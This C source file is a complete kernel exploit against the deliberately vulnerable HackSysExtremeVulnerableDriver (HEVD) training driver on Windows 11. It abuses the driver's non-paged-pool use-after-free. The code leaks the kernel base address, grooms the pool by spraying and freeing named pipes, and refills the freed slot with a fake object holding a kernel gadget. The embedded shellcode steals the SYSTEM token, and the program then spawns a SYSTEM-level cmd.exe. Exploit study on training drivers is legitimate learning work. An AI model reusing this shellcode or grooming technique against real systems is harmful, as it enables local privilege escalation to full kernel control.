/*
HEVD UseUaFObjectNonPagedPool
OS Name	Microsoft Windows 11 Pro
Version	10.0.26100 Build 26100

based on: https://wetw0rk.github.io/posts/0x03-approaching-the-modern-windows-kernel-heap/
*/

#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>

#define HEVD_ALLOCATE_OBJECT	0x222013 // AllocateUaFObjectNonPagedPool
#define HEVD_FREE_OBJECT		0x22201B // FreeUaFObjectNonPagedPool
#define HEVD_ALLOCATE_FAKE		0x22201F // AllocateFakeObjectNonPagedPool
#define HEVD_USE				0x222017 // UseUaFObjectNonPagedPool

#define DEF_PIPES 10000
#define SEQ_PIPES 30000

typedef struct PipeHandles {
	HANDLE read;
	HANDLE write;
} PipeHandles;

struct PipeHandles CreatePipeObject() {
	BYTE uBuffer[0x18] = { 0 }; // sizeof(uBuffer) + (sizeof(_NP_DATA_QUEUE_ENTRY) == 0x48) == ALLOC_SIZE
	HANDLE readPipe = NULL;
	HANDLE writePipe = NULL;
	DWORD resultLength = 0;

	RtlFillMemory(uBuffer, 0x18, 0x41);
	if (!CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer)))
	{
		printf("[-] CreatePipe\n");
	}

	if (!WriteFile(writePipe, uBuffer, sizeof(uBuffer), &resultLength, NULL))
	{
		printf("[-] WriteFile\n");
	}

	return (struct PipeHandles) { .read = readPipe, .write = writePipe };
}

void SendIoctl(HANDLE hDevice, DWORD ioctl, LPVOID buffer, DWORD bufferSize)
{
	DWORD bytesReturned = 0;

	DeviceIoControl(
		hDevice,
		ioctl,
		buffer,
		bufferSize,
		NULL,
		0x00,
		&bytesReturned,
		NULL);

	return;
}

long long GetKernelBaseAddress()
{
	ULONG_PTR pKernelBaseAddress = 0;
	LPVOID* lpImageBase = NULL;
	DWORD dwBytesNeeded = 0;

	if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
		printf("[-] Failed to calculate bytes needed for device driver entries");
		return -1;
	}

	if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
		printf("[-] Failed to allocate heap for lpImageBase\n");
		if (lpImageBase) {
			HeapFree(GetProcessHeap(), 0, lpImageBase);
		}
		return -1;
	}

	if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
		printf("[-] EnumDeviceDrivers: %d", GetLastError());
		if (lpImageBase) {
			HeapFree(GetProcessHeap(), 0, lpImageBase);
		}
		return -1;
	}

	pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
	HeapFree(GetProcessHeap(), 0, lpImageBase);

	printf("[*] Kernel Base Address: %llx\n", pKernelBaseAddress);

	return pKernelBaseAddress;
}

int main()
{
	int i = 0;
	HANDLE hDevice = NULL;
	PipeHandles defragPipes[DEF_PIPES] = { 0 };
	PipeHandles seqPipes[SEQ_PIPES] = { 0 };
	long long kernelBaseAddress = GetKernelBaseAddress();

	char cShellcode[0x58] =
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90" // FUNCTION POINTER
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLED

		// sickle -p windows/x64/kernel_token_stealer -f c -m pinpoint
		"\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00" // movabs rax, qword ptr gs:[0x188]
		"\x48\x8b\x80\xb8\x00\x00\x00"                 // mov rax, qword ptr [rax + 0xb8]
		"\x48\x89\xc1"                                 // mov rcx, rax
		"\xb2\x04"                                     // mov dl, 4
		"\x48\x8b\x80\x48\x04\x00\x00"                 // mov rax, qword ptr [rax + 0x448]
		"\x48\x2d\x48\x04\x00\x00"                     // sub rax, 0x448
		"\x38\x90\x40\x04\x00\x00"                     // cmp byte ptr [rax + 0x440], dl
		"\x75\xeb"                                     // jne 0x1017
		"\x48\x8b\x90\xb8\x04\x00\x00"                 // mov rdx, qword ptr [rax + 0x4b8]
		"\x48\x89\x91\xb8\x04\x00\x00"                 // mov qword ptr [rcx + 0x4b8], rdx

		// KERNEL RECOVERY
		"\x48\x31\xc0"                         // xor rax, rax 
		"\x48\x83\xc4\x48"                     // add rsp, 0x48 
		"\xc3";                                // ret

	printf("[+] Opening handle...\n");
	hDevice = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0x00,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error opening handle (%lu)\n", GetLastError());
		return -1;
	}
	
	printf("[+] Spraying holes...\n");
	for (i = 0; i < DEF_PIPES; i++)
		defragPipes[i] = CreatePipeObject();
	for (i = 0; i < SEQ_PIPES; i++)
		seqPipes[i] = CreatePipeObject();

	printf("[+] Creating holes...\n");
	for (i = 0; i < SEQ_PIPES; i++)
	{
		if (i % 2 == 0)
		{
			CloseHandle(seqPipes[i].read);
			CloseHandle(seqPipes[i].write);
		}
	}

	printf("[+] Allocating target structure...\n");
	SendIoctl(hDevice, HEVD_ALLOCATE_OBJECT, NULL, 0);

	printf("[+] Freeing object...\n");
	SendIoctl(hDevice, HEVD_FREE_OBJECT, NULL, 0);

	printf("[+] Filling holes...\n");
	*(long long*)(cShellcode) = (long long)(kernelBaseAddress + 0x4eb763); // add al, 0x10; call rax;
	printf("Gadget: 0x%llx", (long long)(kernelBaseAddress + 0x4eb763));
	for (int i = 0; i < 30000; i++)
		SendIoctl(hDevice, HEVD_ALLOCATE_FAKE, cShellcode, 0x58);


	printf("[+] Use after free...\n");
	SendIoctl(hDevice, HEVD_USE, NULL, 0);

	system("cmd.exe");

	printf("[?] Exiting...\n");
	return 0;
}
